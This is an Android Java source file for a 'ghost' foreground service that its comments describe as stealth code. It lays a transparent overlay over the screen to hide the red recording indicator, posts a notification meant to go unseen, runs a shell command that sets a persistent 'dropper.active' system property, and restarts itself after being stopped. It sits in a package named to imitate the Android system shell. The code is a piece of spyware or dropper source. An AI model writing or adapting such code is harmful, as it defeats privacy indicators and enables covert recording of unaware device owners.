package com.android.shell.ghost;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.IBinder;
import android.view.Gravity;
import android.view.WindowManager;

/**
 * Stealth foreground service.
 * Holds a wake-lock, keeps the connection alive,
 * and overlays a transparent window to hide the red recording dot.
 */
public class GhostForegroundService extends Service {

    private WindowManager windowManager;
    private android.view.View overlayView;

    @Override
    public void onCreate() {
        super.onCreate();
        windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        // Start foreground with a transparent notification (invisible to user)
        startForeground(1, createNotification());
        // Create the transparent overlay that hides the recording dot
        overlayView = new android.view.View(this);
        overlayView.setBackgroundColor(0x00000000); // fully transparent
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                        | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                PixelFormat.TRANSPARENT);
        params.gravity = Gravity.TOP | Gravity.START;
        windowManager.addView(overlayView, params);
        // Set persistent property
        try {
            Runtime.getRuntime().exec("setprop persist.sys.dropper.active true").waitFor();
        } catch (Exception ignored) {}
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        if (overlayView != null) {
            windowManager.removeView(overlayView);
            overlayView = null;
        }
        try {
            Runtime.getRuntime().exec("setprop persist.sys.dropper.active false").waitFor();
        } catch (Exception ignored) {}
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    private android.app.Notification createNotification() {
        android.app.NotificationChannel channel = new android.app.NotificationChannel(
                "ghost_service", "Ghost Service", android.app.NotificationManager.IMPORTANCE_MIN);
        ((android.app.NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE))
                .createNotificationChannel(channel);
        return new android.app.Notification.Builder(this, "ghost_service")
                .setContentTitle("Ghost")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setOngoing(true)
                .build();
    }
}